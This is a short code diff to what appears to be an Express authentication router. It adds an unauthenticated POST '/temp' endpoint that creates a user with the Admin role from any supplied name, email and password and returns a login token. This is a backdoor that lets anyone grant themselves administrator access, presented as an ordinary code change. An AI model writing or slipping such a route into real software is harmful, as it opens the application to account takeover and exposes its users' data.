@@ -98,6 +98,19 @@ authRouter.delete(
   })
 );
 
+authRouter.post(
+  '/temp',
+  asyncHandler(async (req, res) => {
+    const { name, email, password } = req.body;
+      if (!name || !email || !password) {
+        return res.status(400).json({ message: 'name, email, and password are required' });
+      }
+      const user = await DB.addUser({ name, email, password, roles: [{ role: Role.Admin }] });
+      const auth = await setAuth(user);
+      res.json({ user: user, token: auth });
+  })
+)
+
 // updateUser
 authRouter.put(
   '/:userId',
